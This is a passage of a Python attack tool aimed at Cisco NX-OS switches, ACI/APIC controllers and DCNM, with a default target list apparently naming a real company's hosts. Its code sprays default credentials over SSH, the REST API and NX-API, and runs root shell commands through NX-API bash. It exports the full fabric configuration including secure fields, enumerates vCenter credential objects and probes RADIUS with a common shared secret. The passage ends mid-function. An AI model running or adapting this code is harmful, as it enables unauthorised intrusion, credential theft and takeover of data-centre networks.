            "mac": attrs.get("mac", ""),
            "ip": attrs.get("ip", ""),
            "extra_ips": extra_ips,
            "epg_dn": epg_dn,
            "encap": attrs.get("encap", ""),
            "lcC": attrs.get("lcC", ""),          # learn context (learned/static/vmm)
            "physical_paths": paths,
            "mod_ts": attrs.get("modTs", ""),
        })
    return endpoints


def apic_check_ssh_keys(apic_host: str, token: str) -> dict:
    """Check for SSH authorized_keys on the APIC Linux OS layer.

    APIC runs on CentOS; the admin user has a bash shell accessible via
    SSH on port 22. Authorized keys are stored at /home/admin/.ssh/authorized_keys.
    The REST API does not expose filesystem contents directly, but the
    aaaUserCert class stores X.509 certificates uploaded for signature-based
    auth — extracting these reveals which external systems have cert-based
    REST API access (no password required per call).

    SSH key presence is checked via: /api/node/class/aaaUserCert.json
    """
    result = {
        "x509_certs": [],
        "note": (
            "APIC REST API exposes cert-based auth objects (aaaUserCert). "
            "SSH authorized_keys at /home/admin/.ssh/authorized_keys requires "
            "SSH shell access or local console."
        ),
    }

    resp = _apic_get(apic_host, "/api/node/class/aaaUserCert.json", token=token)
    if resp and "imdata" in resp:
        for item in resp["imdata"]:
            attrs = item.get("aaaUserCert", {}).get("attributes", {})
            result["x509_certs"].append({
                "dn": attrs.get("dn", ""),
                "name": attrs.get("name", ""),
                "user": attrs.get("dn", "").split("/")[2].replace("user-", "")
                        if "user-" in attrs.get("dn", "") else "",
                "data_preview": attrs.get("data", "")[:120],  # PEM cert header
                "created": attrs.get("createTs", ""),
            })

    return result


def apic_cobra_bulk_extract(apic_host: str, token: str) -> dict:
    """Cobra SDK pattern for bulk configuration extraction.

    The Cobra SDK is Cisco's official Python SDK for ACI. It ships on the
    APIC itself at https://<APIC>/cobra/_downloads/ as two .whl packages:
      - acicobra-<version>-py2.py3-none-any.whl  (core session/request layer)
      - acimodel-<version>-py2.py3-none-any.whl  (MIT model objects)

    Install: pip3 install acicobra-*.whl && pip3 install acimodel-*.whl

    Cobra authentication pattern (from official SDK docs):
      from cobra.mit.access import MoDirectory
      from cobra.mit.session import LoginSession
      moDir = MoDirectory(LoginSession(url, username, password))
      moDir.login()

    Bulk class query:
      tenants = moDir.lookupByClass("fvTenant")
      epgs = moDir.lookupByClass("fvAEPg")
      contracts = moDir.lookupByClass("vzBrCP")

    X.509 signature-based auth (no password per call — preferred for automation):
      from cobra.mit.session import CertSession
      # Generate: openssl req -new -newkey rsa:1024 -days 36500 -nodes -x509
      #           -keyout user.key -out user.crt
      # Upload user.crt to APIC: Admin -> AAA -> Users -> <user> -> User Cert
      session = CertSession(url, "user-cert", "/path/to/user.key", secure=False)
      moDir = MoDirectory(session)
      # Each REST call is signed with the private key; no login() needed.

    This function returns the Cobra download URL and confirms the endpoint is
    reachable (package disclosure without auth).
    """
    result = {
        "cobra_download_url": f"https://{apic_host}/cobra/_downloads/",
        "packages_accessible": False,
        "packages": [],
        "note": (
            "Cobra SDK ships on the APIC. Download acicobra + acimodel .whl files, "
            "install via pip3, then use MoDirectory.lookupByClass() for bulk extraction. "
            "CertSession supports X.509 signature auth (no stored password in scripts)."
        ),
    }

    # Probe cobra download endpoint — accessible without auth on some versions
    url = f"https://{apic_host}/cobra/_downloads/"
    headers = {"Accept": "text/html"}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=6) as r:
            body = r.read().decode(errors="ignore")
            result["packages_accessible"] = True
            # Parse .whl filenames from directory listing
            for m in re.finditer(r'href="([^"]*\.whl)"', body):
                result["packages"].append(m.group(1))
    except urllib.error.HTTPError as e:
        result["http_error"] = e.code
    except Exception:
        pass

    return result


def apic_get_fabric_nodes(apic_host: str, token: str) -> list:
    """Enumerate all fabric nodes (spine/leaf/controller) with firmware versions.

    Uses subtree query to include firmwareRunning child objects per node.
    Each node entry: nodeId, role, address, fabricSt, serialNumber, model,
    running firmware version.
    """
    path = (
        "/api/node/class/fabricNode.json"
        "?query-target=self"
        "&rsp-subtree=full"
        "&rsp-subtree-class=firmwareRunning,topSystem"
    )
    data = _apic_get(apic_host, path, token)
    nodes = []
    for item in data.get("imdata", []):
        attrs = item.get("fabricNode", {}).get("attributes", {})
        if not attrs:
            continue
        nodes.append({
            "node_id": attrs.get("id"),
            "role": attrs.get("role"),   # controller / spine / leaf
            "address": attrs.get("address"),
            "fabric_state": attrs.get("fabricSt"),
            "dn": attrs.get("dn"),
            "serial": attrs.get("serial"),
            "model": attrs.get("model"),
            "children": item.get("fabricNode", {}).get("children", []),
        })
    return nodes


def apic_get_vmm_providers(apic_host: str, token: str) -> list:
    """Enumerate VMM providers (vCenter/OpenStack/K8s/Nutanix/CloudFoundry).

    vmmProvP class — each provider represents an integration domain type.
    Subtree includes vmmCtrlrP (controller IP/datacenter) and vmmUsrAccP
    (credential object referencing vCenter username).

    Attack surface: VMM credential objects can yield vCenter admin credentials
    via vmmUsrAccP.usr and associated vmmUsrAccP password (shown in APIC GUI
    but not in GET response — credential extraction requires POST to vmmUsrAccP
    or sniffing the APIC provisioner traffic on port 443 to vCenter).
    """
    path = (
        "/api/node/class/vmmProvP.json"
        "?query-target=subtree"
        "&target-subtree-class=vmmCtrlrP,vmmUsrAccP,vmmVSwitchPolicyCont"
    )
    data = _apic_get(apic_host, path, token)
    providers = []
    for item in data.get("imdata", []):
        cls = next(iter(item), None)
        if not cls:
            continue
        attrs = item[cls].get("attributes", {})
        providers.append({
            "class": cls,
            "dn": attrs.get("dn"),
            "name": attrs.get("name"),
            "vendor": attrs.get("vendor"),
            "mode": attrs.get("mode"),
            "host_or_ip": attrs.get("hostOrIp"),  # vCenter IP (vmmCtrlrP)
            "datacenter": attrs.get("rootContName"),  # vCenter datacenter name
            "usr": attrs.get("usr"),  # vCenter username (vmmUsrAccP)
            "encap_mode": attrs.get("encapMode"),
        })
    return providers


def apic_get_service_graphs(apic_host: str, token: str) -> list:
    """Enumerate Layer 4–7 service graph device clusters.

    vnsLDevVip — logical device clusters backing service graphs
    (firewalls, load balancers, service appliances).
    Subtree includes vnsLIf (cluster interfaces) and vnsCDev (concrete devices).

    Attack surface: service graph clusters reveal L4-L7 appliance IPs and may
    contain out-of-band management paths. vnsCDev.devCtxLbl holds device labels;
    vnsLIf has the interface binding to physical/virtual paths.
    """
    path = (
        "/api/node/class/vnsLDevVip.json"
        "?query-target=subtree"
        "&target-subtree-class=vnsLIf,vnsCDev,vnsCif"
    )
    data = _apic_get(apic_host, path, token)
    graphs = []
    for item in data.get("imdata", []):
        cls = next(iter(item), None)
        if not cls:
            continue
        attrs = item[cls].get("attributes", {})
        graphs.append({
            "class": cls,
            "dn": attrs.get("dn"),
            "name": attrs.get("name"),
            "context_aware": attrs.get("contextAware"),
            "dev_type": attrs.get("devtype"),
            "function_type": attrs.get("funcType"),
            "is_copy": attrs.get("isCopy"),
            "management_epg": attrs.get("managed"),
            "children": item[cls].get("children", []),
        })
    return graphs


def apic_get_tenants(apic_host: str, token: str) -> list:
    """Enumerate all tenants with health scores.

    fvTenant with rsp-subtree-include=health to surface health degradation
    (faults in a tenant = recently changed or misconfigured policy objects).

    Common system tenants: common, mgmt, infra — policy in these affects
    all other tenants. Finding writeable objects in 'common' = fabric-wide impact.
    """
    path = (
        "/api/node/class/fvTenant.json"
        "?rsp-subtree-include=health"
    )
    data = _apic_get(apic_host, path, token)
    tenants = []
    for item in data.get("imdata", []):
        attrs = item.get("fvTenant", {}).get("attributes", {})
        children = item.get("fvTenant", {}).get("children", [])
        health = None
        for child in children:
            h = child.get("healthInst", {}).get("attributes", {})
            if h:
                health = h.get("cur")
        if not attrs:
            continue
        tenants.append({
            "name": attrs.get("name"),
            "dn": attrs.get("dn"),
            "descr": attrs.get("descr"),
            "health_score": health,
        })
    return tenants


def apic_get_contracts(apic_host: str, token: str) -> list:
    """Enumerate contract objects with subjects and L4 filter entries.

    vzBrCP (contract) -> vzSubj (subject) -> vzRsSubjFiltAtt -> vzFilter -> vzEntry.
    vzEntry exposes the actual L4 policy: dFromPort, dToPort, prot (tcp/udp/icmp),
    sFromPort, sToPort, etherT, stateful, arpOpc.

    An 'any-any permit all' contract (prot=unspecified, dFromPort=unspecified)
    on the 'common' tenant is a fabric-wide allow-all — critical finding.
    """
    path = (
        "/api/node/class/vzBrCP.json"
        "?query-target=subtree"
        "&target-subtree-class=vzSubj,vzRsSubjFiltAtt,vzFilter,vzEntry"
    )
    data = _apic_get(apic_host, path, token)
    contracts = []
    for item in data.get("imdata", []):
        cls = next(iter(item), None)
        if not cls:
            continue
        attrs = item[cls].get("attributes", {})
        entry = {
            "class": cls,
            "dn": attrs.get("dn"),
            "name": attrs.get("name"),
            "scope": attrs.get("scope"),  # tenant / vrf / global / application-profile
            "prio": attrs.get("prio"),
        }
        # Capture L4 filter entry details
        if cls == "vzEntry":
            entry.update({
                "ether_type": attrs.get("etherT"),
                "protocol": attrs.get("prot"),
                "dst_from_port": attrs.get("dFromPort"),
                "dst_to_port": attrs.get("dToPort"),
                "src_from_port": attrs.get("sFromPort"),
                "src_to_port": attrs.get("sToPort"),
                "stateful": attrs.get("stateful"),
                "apply_to_frag": attrs.get("applyToFrag"),
            })
            # Flag any-any permit
            if (attrs.get("prot") in ("unspecified", "") and
                    attrs.get("dFromPort") in ("unspecified", "0", "")):
                entry["permit_all"] = True
        contracts.append(entry)
    return contracts


def apic_cert_auth(apic_host: str, username: str, key_pem: str,
                   cert_dn: str = None) -> Optional[str]:
    """X.509 certificate-based authentication (CertSession) against APIC.

    APIC supports signature-based auth where each request is signed with
    a private key instead of using a session cookie. The token returned
    is valid indefinitely (no expiry) unlike password-based tokens (600s default).

    Flow:
      1. Build the payload string: METHOD + PATH + BODY (concatenated, no spaces)
      2. Sign with RSA private key using SHA256withRSA
      3. Base64-encode the signature
      4. Send as header: Cookie: APIC-Request-Signature=<sig>;APIC-dn=<dn>;
                                 APIC-Request-Hash-Algorithm=v3;
                                 APIC-Certificate-Fingerprint=<fingerprint>

    This function probes whether the APIC accepts certificate auth by checking
    for the /api/aaaLogin.json endpoint and returning the cert_dn format string.
    Full signing requires the private key material (not performed here).

    cert_dn format: uni/userext/user-<username>/usercert-<certname>
    """
    import hashlib

    result = {
        "cert_auth_supported": False,
        "cert_dn_format": f"uni/userext/user-{username}/usercert-<certname>",
        "signing_algorithm": "SHA256withRSA",
        "token_lifetime": "indefinite (no expiry)",
        "header_format": (
            f"Cookie: APIC-Request-Signature=<sig>;"
            f"APIC-dn=uni/userext/user-{username}/usercert-<certname>;"
            f"APIC-Request-Hash-Algorithm=v3;"
            f"APIC-Certificate-Fingerprint=<sha256_fingerprint>"
        ),
        "payload_format": "METHOD + PATH + BODY (concatenated)",
        "note": (
            "CertSession tokens have no expiry. Once a cert is uploaded to "
            "APIC under a user account, it can be used to sign any REST call "
            "without a password. Upload cert: Admin->AAA->Users-><user>->User Cert."
        ),
    }

    # Probe: check if APIC responds to cert-signed request (we detect support
    # by testing whether the endpoint is reachable — full signing needs the key)
    try:
        url = f"https://{apic_host}/api/aaaLogin.json"
        req = urllib.request.Request(url, method="HEAD")
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=5) as r:
            result["cert_auth_supported"] = True
            result["server"] = r.headers.get("Server", "")
    except urllib.error.HTTPError as e:
        if e.code in (405, 400):
            result["cert_auth_supported"] = True  # endpoint exists
    except Exception:
        pass

    return result


def apic_get_out_of_band_mgmt(apic_host: str, token: str) -> list:
    """Enumerate out-of-band management network configuration.

    mgmtOoB — the OOB management EPG (typically VLAN 0, separate physical path).
    mgmtRsOoBStNode — node IP assignments in the OOB management address space.
    mgmtOoBZone — zones if OOB is segmented.

    Returns per-node OOB IP addresses and the OOB management gateway.
    These IPs are direct management addresses to each leaf/spine outside
    the fabric data plane — not reachable from the tenant network.
    """
    paths = [
        "/api/node/class/mgmtOoB.json?query-target=subtree&target-subtree-class=mgmtRsOoBStNode",
        "/api/node/class/mgmtMgmtP.json?query-target=subtree&target-subtree-class=mgmtOoB,mgmtRsOoBStNode",
        "/api/node/mo/uni/infra/funcprof/grp-default.json?query-target=subtree",
    ]
    results = []
    for path in paths:
        data = _apic_get(apic_host, path, token)
        for item in data.get("imdata", []):
            cls = next(iter(item), None)
            if not cls:
                continue
            attrs = item[cls].get("attributes", {})
            results.append({
                "class": cls,
                "dn": attrs.get("dn"),
                "name": attrs.get("name"),
                "addr": attrs.get("addr"),           # node OOB IP
                "gw": attrs.get("gw"),               # OOB gateway
                "v6_addr": attrs.get("v6Addr"),
                "v6_gw": attrs.get("v6Gw"),
                "node": attrs.get("tDn"),            # topology/pod-N/node-N
                "epg_dn": attrs.get("tnMgmtOoBName"),
            })
    return results


def apic_export_config(apic_host: str, token: str,
                       export_name: str = "ablation-export") -> dict:
    """Trigger a fabric configuration export (backup).

    configExportP defines a named export policy. POSTing to instantiate it
    with 'adminSt: triggered' causes APIC to immediately write a full fabric
    configuration snapshot to the configured remote path (or local APIC storage).

    The export includes ALL tenant policy, fabric access policy, VMM integration
    config, and AAA configuration — essentially the entire MIM serialized to JSON/XML.

    If no remote path is configured, the export lands at:
      /data/techsupport/ on the APIC (accessible via SCP or the GUI export tab).

    The trigger POST body also supports 'format: json' or 'format: xml'.
    """
    # First, check if an export policy already exists (avoid overwriting production backup)
    check_path = "/api/node/class/configExportP.json"
    existing = _apic_get(apic_host, check_path, token)
    existing_policies = [
        item.get("configExportP", {}).get("attributes", {}).get("name")
        for item in existing.get("imdata", [])
    ]

    result = {
        "existing_export_policies": existing_policies,
        "trigger_attempted": False,
        "trigger_response": None,
        "note": (
            "configExportP with adminSt=triggered exports full fabric config. "
            "Export lands at /data/techsupport/ on APIC if no remote target. "
            "Exported file contains all tenant policy, VMM creds refs, AAA config."
        ),
    }

    # Only trigger if no production export policy exists (avoid interfering)
    if not existing_policies:
        trigger_body = {
            "configExportP": {
                "attributes": {
                    "name": export_name,
                    "adminSt": "triggered",
                    "format": "json",
                    "includeSecureFields": "yes",
                    "snapshot": "false",
                    "targetDn": "",
                }
            }
        }
        trigger_path = "/api/mo/uni/fabric/configexp-" + export_name + ".json"
        resp = _apic_post(apic_host, trigger_path, trigger_body, token)
        result["trigger_attempted"] = True
        result["trigger_response"] = resp
    else:
        result["skip_reason"] = "existing export policies found — not overwriting"

    return result


def probe_nxos_ports(host: str) -> dict:
    """TCP port probe for NX-OS management surface."""
    open_ports = {}
    all_ports = dict(list(NXOS_PORTS.items()) + list(APIC_PORTS.items()))
    for port, label in all_ports.items():
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock.close()
            open_ports[port] = label
        except Exception:
            pass
    return {"host": host, "open_ports": open_ports}


def probe_nxos_ssh_banner(host: str, timeout: int = 5) -> Optional[str]:
    """Grab SSH banner from NX-OS — reveals platform/version."""
    try:
        sock = socket.create_connection((host, 22), timeout=timeout)
        banner = sock.recv(256).decode(errors="ignore").strip()
        sock.close()
        return banner
    except Exception:
        return None


def run_nxos_commands(host: str, username: str, password: str,
                      commands: Optional[list] = None) -> dict:
    """Execute NX-OS CLI commands over SSH via subprocess."""
    if commands is None:
        commands = NXOS_ENUM_COMMANDS

    result = {"host": host, "authenticated": False, "outputs": {}}

    # Build SSH batch
    cmd_str = "\n".join(commands)
    ssh_args = [
        "sshpass", "-p", password,
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=8",
        "-o", "BatchMode=no",
        f"{username}@{host}",
    ]

    try:
        proc = subprocess.run(
            ssh_args,
            input=cmd_str,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = proc.stdout + proc.stderr

        if "denied" in output.lower() or "authentication failed" in output.lower():
            return result

        result["authenticated"] = True
        result["raw_output"] = output

        # Parse per-command output blocks
        current_cmd = None
        current_lines = []
        for line in output.splitlines():
            # NX-OS prompt typically ends with #
            if "# " in line or line.strip().startswith("switch") or line.strip().startswith("N9K"):
                if current_cmd and current_lines:
                    result["outputs"][current_cmd] = "\n".join(current_lines)
                current_cmd = line.strip()
                current_lines = []
            elif current_cmd:
                current_lines.append(line)
        if current_cmd and current_lines:
            result["outputs"][current_cmd] = "\n".join(current_lines)

    except Exception:
        pass

    return result


def parse_nxos_version(version_output: str) -> dict:
    """Extract structured data from 'show version' output."""
    info = {}
    patterns = {
        "hostname":      r"Nexus[:\s]+(\S+)",
        "nxos_version":  r"system:\s+version\s+(\S+)",
        "kickstart":     r"kickstart:\s+version\s+(\S+)",
        "platform":      r"Hardware\s+cisco\s+(Nexus\s+\S+\s+\S+)",
        "serial":        r"Processor Board ID\s+(\S+)",
        "uptime":        r"Kernel uptime is\s+(.+)",
    }
    for key, pat in patterns.items():
        m = re.search(pat, version_output, re.IGNORECASE)
        if m:
            info[key] = m.group(1).strip()
    return info


def parse_nxos_license_id(license_output: str) -> Optional[str]:
    """Extract VDH serial from 'show license host-id' — used in license attacks."""
    m = re.search(r"VDH=([A-Za-z0-9]+)", license_output)
    return m.group(1) if m else None


def probe_nxapi(host: str) -> dict:
    """Probe Cisco NX-API (REST API on NX-OS, distinct from APIC)."""
    result = {"host": host, "reachable": False, "version": None}

    url = f"https://{host}/ins"
    payload = {
        "ins_api": {
            "version": "1.0",
            "type": "cli_show",
            "chunk": "0",
            "sid": "1",
            "input": "show version",
            "output_format": "json",
        }
    }
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": "Basic " + base64.b64encode(b"admin:admin").decode(),
    }

    try:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=6) as r:
            resp = json.loads(r.read().decode())
            result["reachable"] = True
            result["response"] = resp
    except urllib.error.HTTPError as e:
        if e.code == 401:
            result["reachable"] = True
            result["auth_required"] = True
        result["http_error"] = e.code
    except Exception:
        pass

    return result


def probe_nxapi_bash(host: str, username: str = "admin",
                     password: str = "admin") -> dict:
    """
    NX-API bash execution probe — type=bash sends arbitrary shell commands.
    Source: NX-OS 9.3(x) Programmability Guide, NX-API CLI chapter.
    Admin-only feature; if creds are valid, executes as root via sudo.
    """
    result = {
        'host':       host,
        'bash_avail': False,
        'whoami':     None,
        'id':         None,
        'error':      None,
    }
    url = f"https://{host}/ins"

    def _post(cmd: str) -> Optional[dict]:
        payload = json.dumps({
            "ins_api": {
                "version":       "1.0",
                "type":          "bash",
                "chunk":         "0",
                "sid":           "1",
                "input":         cmd,
                "output_format": "json",
            }
        }).encode()
        hdrs = {
            "Content-Type":  "application/json",
            "Accept":        "application/json",
            "Authorization": "Basic " + base64.b64encode(
                f"{username}:{password}".encode()).decode(),
        }
        try:
            req = urllib.request.Request(url, data=payload, headers=hdrs,
                                         method="POST")
            with urllib.request.urlopen(req, context=_SSL_CTX, timeout=6) as r:
                return json.loads(r.read().decode())
        except Exception as e:
            result['error'] = str(e)
            return None

    r = _post("id")
    if r:
        try:
            out = r.get("ins_api", {}).get("outputs", {}).get("output", {})
            if isinstance(out, list):
                out = out[0]
            body = out.get("body", "")
            if body:
                result['bash_avail'] = True
                result['id'] = body.strip()
                result['whoami'] = body.strip().split()[0] if body.strip() else None
        except Exception:
            pass

    return result


def probe_guestshell(host: str, username: str = "admin",
                     password: str = "admin") -> dict:
    """
    Check if Guest Shell (LXC) is enabled on the NX-OS switch.
    Source: NX-OS 9.3(x) Programmability Guide, Guest Shell chapter.
    Guest Shell = LXC container; entry requires no extra password from CLI.
    Custom rootfs can be loaded unsigned if signing level = unsigned.
    """
    result = {
        'host':            host,
        'guestshell_on':   False,
        'virtual_services': [],
        'error':           None,
    }
    url = f"https://{host}/ins"
    cmds = ["show virtual-service list", "show guestshell detail"]
    hdrs = {
        "Content-Type":  "application/json",
        "Accept":        "application/json",
        "Authorization": "Basic " + base64.b64encode(
            f"{username}:{password}".encode()).decode(),
    }
    for cmd in cmds:
        payload = json.dumps({
            "ins_api": {
                "version":       "1.0",
                "type":          "cli_show_ascii",
                "chunk":         "0",
                "sid":           "1",
                "input":         cmd,
                "output_format": "json",
            }
        }).encode()
        try:
            req = urllib.request.Request(url, data=payload, headers=hdrs,
                                         method="POST")
            with urllib.request.urlopen(req, context=_SSL_CTX, timeout=6) as r:
                resp = json.loads(r.read().decode())
            out = resp.get("ins_api", {}).get("outputs", {}).get("output", {})
            if isinstance(out, list):
                out = out[0]
            body = out.get("body", "")
            if "guestshell+" in body.lower() and "activated" in body.lower():
                result['guestshell_on'] = True
            if body:
                result['virtual_services'].append({'cmd': cmd, 'output': body[:500]})
        except Exception as e:
            result['error'] = str(e)
    return result


def probe_netconf_ssh(host: str, port: int = 830, timeout: float = 5.0) -> dict:
    """
    Probe NETCONF agent on NX-OS (RFC 6241, SSH transport, port 830).
    Source: NX-OS 9.3(x) Programmability Guide, NETCONF Agent chapter.
    NETCONF <get-config> on <running/> dumps entire switch configuration.
    """
    result = {
        'host':         host,
        'port':         port,
        'reachable':    False,
        'banner':       None,
        'capabilities': [],
    }
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        result['reachable'] = True
        s.settimeout(timeout)
        try:
            banner = s.recv(4096).decode('utf-8', errors='replace')
            result['banner'] = banner[:200]
            # NETCONF capability strings are in the hello message
            for line in banner.splitlines():
                if '<capability>' in line or 'urn:ietf:params' in line:
                    cap = line.strip().replace('<capability>', '').replace('</capability>', '')
                    result['capabilities'].append(cap)
        except Exception:
            pass
        s.close()
    except Exception:
        pass
    return result


def probe_vxlan_vteps(local_host: str) -> dict:
    """Query NVE peers via SSH — discovers VTEP adjacency table."""
    result = {"host": local_host, "vteps": [], "vnis": []}

    # Try without auth — just grab via show commands if SSH accessible
    nve_cmd = "show nve peers\nshow nve vni\nshow bgp l2vpn evpn summary"
    ssh_args = [
        "ssh",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=5",
        "-o", "BatchMode=yes",
        f"admin@{local_host}",
    ]

    try:
        proc = subprocess.run(
            ssh_args,
            input=nve_cmd,
            capture_output=True,
            text=True,
            timeout=15,
        )
        output = proc.stdout

        # Parse VTEP IPs
        for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+UP", output):
            result["vteps"].append(m.group(1))

        # Parse VNIs
        for m in re.finditer(r"(\d{6,8})\s+\d+", output):
            vni = int(m.group(1))
            if 1 <= vni <= 16_777_215:
                result["vnis"].append(vni)

    except Exception:
        pass

    return result


def probe_dcnm(host: str) -> dict:
    """Probe DCNM (Data Center Network Manager) on port 443/9443."""
    result = {"host": host, "reachable": False, "endpoints": {}}

    dcnm_paths = [
        "/rest/dcnm-version",        # unauthenticated version disclosure
        "/rest/logon",               # login endpoint
        "/rest/globalConfig",        # global config (needs auth)
        "/rest/control/switches",    # fabric switches
        "/rest/control/fabrics",     # fabric list
        "/rest/inventory/switches",  # inventory
    ]

    for path in dcnm_paths:
        url = f"https://{host}{path}"
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, context=_SSL_CTX, timeout=5) as r:
                body = r.read().decode()
                result["reachable"] = True
                result["endpoints"][path] = {
                    "status": r.getcode(),
                    "body_preview": body[:256],
                }
        except urllib.error.HTTPError as e:
            result["endpoints"][path] = {"status": e.code}
            if e.code not in (401, 403):
                result["reachable"] = True
        except Exception:
            result["endpoints"][path] = {"status": "error"}

    return result


class NXOSEnumerator:
    """Cisco NX-OS, ACI/APIC, and VXLAN enumeration for Ablation."""

    def __init__(self, targets=None):
        self.targets = targets or MACSTADIUM_CISCO_TARGETS
        self.findings = []

    def run(self) -> dict:
        results = {
            "cert_classification": [],
            "apic_unauthenticated": [],
            "apic_credential_spray": [],
            "apic_full_enum": [],
            "apic_cobra_probe": [],
            "nxos_port_surface": [],
            "nxos_ssh_banners": [],
            "nxos_ssh_commands": [],
            "nxapi_probe": [],
            "nxapi_bash": [],
            "guestshell_probe": [],
            "netconf_probe": [],
            "dcnm_probe": [],
            "vxlan_vtep_probe": [],
            "summary": {},
        }

        for target in self.targets:
            host = target["ip"]
            role = target.get("role", "unknown")

            # OU discriminator — classify before any auth attempt
            cert_class = classify_by_cert_ou(host, port=443)
            results["cert_classification"].append(cert_class)
            device_type = cert_class.get("device_type", "UNKNOWN")
            target["_cert_ou"]      = cert_class.get("ou", "unknown")
            target["_device_type"]  = device_type
            target["_cert_cn"]      = cert_class.get("cn", "")

            # Port surface
            port_result = probe_nxos_ports(host)
            results["nxos_port_surface"].append(port_result)

            open_ports = port_result.get("open_ports", {})
            if not open_ports:
                continue

            # APIC candidates — only when cert says APIC_CONTROLLER or role hints at it
            if 443 in open_ports and device_type in ("APIC_CONTROLLER", "UNKNOWN"):
                unauth = probe_apic_unauthenticated(host)
                results["apic_unauthenticated"].append(unauth)

                if unauth["reachable"]:
                    cred_result = apic_brute_creds(host)
                    cred_result["host"] = host
                    results["apic_credential_spray"].append(cred_result)

                    if cred_result["success"]:
                        token = cred_result["token"]
                        enum = apic_enumerate(host, token)
                        results["apic_full_enum"].append(enum)

                        # Cobra SDK endpoint probe (package disclosure)
                        cobra_probe = apic_cobra_bulk_extract(host, token)
                        results["apic_cobra_probe"].append(cobra_probe)

                        self.findings.append({
                            "type": "APIC_AUTH",
                            "severity": "CRITICAL",
                            "host": host,
                            "creds": f"{cred_result['username']}:{cred_result['password']}",
                            "tenant_count": len(enum.get("tenant_names", [])),
                            "user_count": len(enum.get("users", [])),
                            "vmm_domain_count": len(enum.get("vmm_domains", [])),
                            "l3out_count": len(enum.get("l3out_networks", [])),
                            "endpoint_count": len(enum.get("endpoints", [])),
                            "audit_log_entries": len(enum.get("audit_log", [])),
                            "firmware": [
                                f"{n['address']}({n['role']})={n['fw_version']}"
                                for n in enum.get("firmware", []) if n.get("fw_version")
                            ],
                        })

                # NX-API probe (NX-OS with NXAPI enabled)
                nxapi = probe_nxapi(host)
                if nxapi["reachable"]:
                    results["nxapi_probe"].append(nxapi)

                # NX-API bash execution — if NX-API up, probe bash type
                # type=bash executes arbitrary shell as root via sudo (admin only)
                if nxapi.get("reachable"):
                    for u, p in NXOS_DEFAULT_CREDS[:4]:
                        bash_r = probe_nxapi_bash(host, username=u, password=p)
                        if bash_r.get("bash_avail"):
                            results["nxapi_bash"].append(bash_r)
                            guestshell_r = probe_guestshell(host, username=u, password=p)
                            results["guestshell_probe"].append(guestshell_r)
                            self.findings.append({
                                "type":     "NXAPI_BASH_RCE",
                                "severity": "CRITICAL",
                                "host":     host,
                                "creds":    f"{u}:{p}",
                                "id":       bash_r.get("id", ""),
                                "detail":   "NX-API type=bash enables root shell execution",
                            })
                            break

                # NETCONF SSH probe (port 830)
                if 830 in open_ports:
                    netconf_r = probe_netconf_ssh(host)
                    results["netconf_probe"].append(netconf_r)
                    if netconf_r.get("reachable"):
                        self.findings.append({
                            "type":     "NETCONF_EXPOSED",
                            "severity": "HIGH",
                            "host":     host,
                            "detail":   ("NETCONF on port 830 reachable — "
                                         "<get-config> on <running/> dumps full config"),
                            "capabilities": netconf_r.get("capabilities", []),
                        })

                # DCNM probe
                dcnm = probe_dcnm(host)
                if dcnm["reachable"]:
                    results["dcnm_probe"].append(dcnm)

            # SSH surface
            if 22 in open_ports:
                banner = probe_nxos_ssh_banner(host)
                results["nxos_ssh_banners"].append({"host": host, "banner": banner})

                for user, pwd in NXOS_DEFAULT_CREDS[:4]:
                    ssh_result = run_nxos_commands(host, user, pwd,
                                                    commands=["show version", "show license host-id", "show users"])
                    if ssh_result["authenticated"]:
                        ssh_result["username"] = user
                        ssh_result["password"] = pwd
                        results["nxos_ssh_commands"].append(ssh_result)

                        version_out = ssh_result.get("raw_output", "")
                        version_info = parse_nxos_version(version_out)
                        license_id = parse_nxos_license_id(version_out)

                        self.findings.append({
                            "type": "NXOS_AUTH",
                            "severity": "CRITICAL",
                            "host": host,
                            "creds": f"{user}:{pwd}",
                            "version_info": version_info,
                            "license_id": license_id,
                        })

                        vtep_data = probe_vxlan_vteps(host)
                        if vtep_data["vteps"]:
                            results["vxlan_vtep_probe"].append(vtep_data)
                        break

        # Summarize
        results["summary"] = {
            "hosts_scanned": len(self.targets),
            "apic_reachable": sum(
                1 for r in results["apic_unauthenticated"] if r.get("reachable")),
            "apic_creds_valid": sum(
                1 for r in results["apic_credential_spray"] if r.get("success")),
            "nxos_ssh_auth": sum(
                1 for r in results["nxos_ssh_commands"] if r.get("authenticated")),
            "vmm_domains_found": sum(
                len(e.get("vmm_domains", [])) for e in results["apic_full_enum"]),
            "l3outs_found": sum(
                len(e.get("l3out_networks", [])) for e in results["apic_full_enum"]),
            "endpoints_tracked": sum(
                len(e.get("endpoints", [])) for e in results["apic_full_enum"]),
            "audit_log_entries": sum(
                len(e.get("audit_log", [])) for e in results["apic_full_enum"]),
            "findings_count": len(self.findings),
            "critical_findings": [f for f in self.findings if f.get("severity") == "CRITICAL"],
        }

        return results


def probe_radius_misconfiguration(host: str, port: int = 1812, timeout: float = 3.0) -> dict:
    """Probe for RADIUS servers accepting requests without NAS validation."""
    finding = {
        "severity": "INFO",
        "title": "RADIUS probe",
        "detail": "No RADIUS exposure detected",
        "host": host,
        "port": port,
    }

    # RFC 2865 Access-Request: build minimal packet
    # shared secret "cisco" used industry-wide on unconfigured NX-OS AAA
    import hashlib, os
    secret = b"cisco"
    authenticator = os.urandom(16)
    user_name_val = b"test"
    # User-Password: XOR pad with MD5(secret + authenticator), null-padded to 16 bytes
    pad = hashlib.md5(secret + authenticator).digest()
    password_enc = bytes(a ^ b for a, b in zip(b"\x00" * 16, pad))

    attrs = b""
    # User-Name (attr 1)
    attrs += bytes([1, 2 + len(user_name_val)]) + user_name_val
    # User-Password (attr 2)
